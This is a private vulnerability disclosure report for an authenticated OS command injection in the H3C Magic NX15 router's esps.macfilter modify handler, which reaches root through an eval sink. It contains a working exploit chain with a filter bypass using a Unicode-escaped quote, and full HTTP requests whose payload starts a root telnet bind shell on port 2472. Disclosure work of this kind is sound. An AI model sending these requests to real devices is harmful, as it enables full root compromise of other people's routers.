# H3C Magic NX15 `esps.macfilter.modify` Authenticated OS Command Injection to Root Remote Code Execution

## Vulnerability Summary

- Discovery date: 2026-06-11
- Researcher: coconut
- Vendor: H3C
- Product: H3C Magic NX15
- Verified firmware / software version: NX15V100R017
- Affected version(s): NX15V100R017 confirmed; other versions not verified
- Component: `usr/libexec/rpcd/esps.macfilter` `modify` handler and its `eval ubus call usrlist modify_terminal_name` sink
- Reachable endpoint: `POST /api/esps`
- Reachable method / action: `object="esps.macfilter"`, `method="modify"`
- Authentication: administrator
- Attack vector: remote
- Impact: authenticated arbitrary OS command execution as root in a single request
- Root cause class: shell metacharacter injection / OS command injection caused by attacker-controlled data in an `eval` sink
- Candidate CWEs: `CWE-78`
- Disclosure status: private
- CVE ID: pending

## CVE Submission-Style Summary

H3C Magic NX15 firmware `NX15V100R017` contains an authenticated OS command injection vulnerability in the `esps.macfilter.modify` handler reachable via `POST /api/esps`. The vulnerable code path accepts attacker-controlled input through the JSON field `description`, embeds it into a hand-built `_list` shell fragment, and passes the result to `eval ubus call usrlist modify_terminal_name` without safe serialization or quoting. This allows a remote attacker with a valid administrator session to execute arbitrary OS commands as root by supplying a syntactically valid MAC address and a Unicode-escaped single quote payload in `description`.

The issue was verified by source inspection of `usr/libexec/rpcd/esps.macfilter`, the included local report, and the included PoC. On the tested target, exploitation returned a success response, opened a root shell on TCP/2472, and produced both `uid=0(root) gid=0(root)` and the marker string `MACFILTER_MODIFY_RCE_OK`.

## Attack Surface

The issue is reachable through the authenticated H3C web management API at `POST /api/esps`. The attacker sends a JSON array whose first element selects `object="esps.macfilter"` and `method="modify"`. The attacker controls `param.description` and must supply a syntactically valid `param.mac`. The backend parses the JSON body, may create a new MAC-filter entry for a fresh valid MAC, then embeds `description` into a shell fragment and reparses it with `eval`.

If useful, the request envelope is:

```http
POST /api/esps HTTP/1.1
Host: 192.168.8.1
Content-Type: application/json
AUTHENTICATION: <session>
```

And the relevant request or trigger shape is:

```json
[
  {
    "id": 1,
    "object": "esps.macfilter",
    "method": "modify",
    "param": {
      "mac": "02:AA:BB:CC:ED:37",
      "description": "x\u0027;echo MACFILTER_MODIFY_RCE_OK >/tmp/macfilter_modify_rce_marker; /usr/sbin/telnetd -p 2472 -l /bin/sh >/dev/null 2>&1;#",
      "internet": "true"
    }
  }
]
```

## Authentication Boundary

This issue requires a valid web administrator session token returned by `POST /api/login/auth`.

Minimum authenticated flow:

1. Send `POST /api/login/auth` with administrator credentials.
2. Read the session token from the JSON response field `data.session`.
3. Reuse that value in the `AUTHENTICATION` header for `POST /api/esps`.
4. Send a raw JSON request body whose `description` field contains the literal wire sequence `\u0027` so that the backend JSON parser materializes a real single quote before the shell `eval` runs.

The issue is still exploitable if the attacker already has a valid administrator session token and skips the login sequence above.

## Root Cause

### 1. Vulnerable input source

The handler reads attacker-controlled values from the `/api/esps` request body and stores them in shell variables. Verified fact: the `modify)` branch parses `mac`, `description`, and `internet` directly from JSON.

```text
json_get_var _mac mac
...
json_get_var _description description
json_get_var _internet internet
```

### 2. Vulnerable sink

After the handler either creates a new rule for the supplied MAC or updates an existing one, it constructs `_list` with attacker-controlled `_description` and passes the result to `eval`.

```text
if [ "$check_repeat" -eq "0" ]; then
    code=$(macfilter_addCurUser "$_mac" "$_description" "$_internet")
fi
...
_list='\{""mac":"$_mac","name":"$_description", "internet":"$_internet""\}'
eval ubus call usrlist modify_terminal_name "$_list" > /dev/null
```

### 3. Why exploitation works

- `description` is fully attacker-controlled after JSON parsing.
- The handler does not use a shell-safe serializer when embedding `_description` into `_list`.
- `eval` forces the shell to reparse the entire constructed command line, so shell metacharacters become active syntax rather than inert data.
- A fresh but syntactically valid MAC still reaches the same sink because the handler calls `macfilter_addCurUser()` and then continues to the success path.
- Runtime proof shows the spawned shell runs as `root`.

### 4. Why naive payloads fail

A direct raw single quote in the HTTP body is blocked by the outer `/api/esps` filter and returns `{"code":21,"message":"'"}`. The tested exploit must preserve the literal wire sequence `\u0027` inside a raw JSON body so that the outer filter does not see a real quote but the backend JSON parser still produces one before the shell `eval` runs. A syntactically invalid MAC does not reach the sink.

## Reverse Engineering Evidence

### Primary function / handler evidence

- file / module: `usr/libexec/rpcd/esps.macfilter`
- function name: `modify)`
- function address: `N/A`
- function size: `N/A`

Relevant decompiled or source-level snippet:

```text
json_get_var _description description
...
if [ "$check_repeat" -eq "0" ]; then
    code=$(macfilter_addCurUser "$_mac" "$_description" "$_internet")
else
    config_foreach macfilter_modify macbind "$_mac" "$_description" "$_internet"
fi
if [ "$code" -eq "0" ]; then
    _list='\{""mac":"$_mac","name":"$_description", "internet":"$_internet""\}'
    eval ubus call usrlist modify_terminal_name "$_list" > /dev/null
fi
```

### Control-flow or data-flow summary

`POST /api/esps` -> `esps.macfilter modify` -> `json_get_var _description` -> `_list=...$_description...` -> `eval ubus call usrlist modify_terminal_name "$_list"` -> injected shell commands execute -> marker file and temporary telnet shell

## Verified Exploitation Chain

### Mode A: one-request authenticated root RCE via `description`

- prerequisites: network reachability to `192.168.8.1` and a valid administrator session token
- injected field / primitive: `param.description` containing a `\u0027;<payload>;#` sequence
- target path / object / resource: `esps.macfilter.modify` and its `eval ubus call usrlist modify_terminal_name` path
- verified payload:

```text
x\u0027;echo MACFILTER_MODIFY_RCE_OK >/tmp/macfilter_modify_rce_marker; /usr/sbin/telnetd -p 2472 -l /bin/sh >/dev/null 2>&1;#
```

Effect:
1. Authenticate to `POST /api/login/auth` and obtain a session token.
2. Send `POST /api/esps` with `object="esps.macfilter"`, `method="modify"`, a valid MAC, and the payload above in `description`.
3. The target returns a success response and opens `telnetd -p 2472 -l /bin/sh`.
4. Connecting to TCP/2472 shows `uid=0(root) gid=0(root)` and the marker file content `MACFILTER_MODIFY_RCE_OK`.

## Live Exploitation Evidence

### PoC-generated payload

```text
x\u0027;echo MACFILTER_MODIFY_RCE_OK >/tmp/macfilter_modify_rce_marker; /usr/sbin/telnetd -p 2472 -l /bin/sh >/dev/null 2>&1;#
```

### PoC-sent request body

```json
[
  {
    "id": 1,
    "object": "esps.macfilter",
    "method": "modify",
    "param": {
      "mac": "02:AA:BB:CC:ED:37",
      "description": "x\u0027;echo MACFILTER_MODIFY_RCE_OK >/tmp/macfilter_modify_rce_marker; /usr/sbin/telnetd -p 2472 -l /bin/sh >/dev/null 2>&1;#",
      "internet": "true"
    }
  }
]
```

### Success condition

A success response from `/api/esps`, a successful TCP connection to `192.168.8.1:2472`, shell output showing `uid=0(root) gid=0(root)`, and the marker file content `MACFILTER_MODIFY_RCE_OK`.

## Why This Is Root Remote Code Execution

This issue is correctly classified as root remote code execution because the verified exploit path yields attacker-controlled code execution in the device's privileged management or update-processing context and the observed effects are not limited to inert configuration corruption. The local report and PoC demonstrate that successful exploitation crosses into the root trust boundary and produces attacker-controlled execution or installation effects that are sufficient for full device compromise.

## Minimal HTTP Request Shape

### 1. Authentication request

```http
POST /api/login/auth HTTP/1.1
Host: 192.168.8.1
Content-Type: application/json

{"username":"admin","password":"admin123"}
```

### 2. Trigger request

```http
POST /api/esps HTTP/1.1
Host: 192.168.8.1
Content-Type: application/json
AUTHENTICATION: <session>

[{"id":1,"object":"esps.macfilter","method":"modify","param":{"mac":"02:AA:BB:CC:ED:37","description":"x\u0027;echo MACFILTER_MODIFY_RCE_OK >/tmp/macfilter_modify_rce_marker; /usr/sbin/telnetd -p 2472 -l /bin/sh >/dev/null 2>&1;#","internet":"true"}}]
```

## Minimal Vulnerable Flow

```text
Authenticated remote attacker -> `/api/login/auth` -> session token in `AUTHENTICATION` header -> `/api/esps` `object=esps.macfilter` `method=modify` -> `_description` embedded into `_list` -> `eval` reparses shell syntax -> root command execution
```

## Included Local Submission Artifacts

- Primary local report: `report/postauth_esps_macfilter_modify_rce_report.md`
- `poc/postauth_esps_macfilter_modify_rce.py`
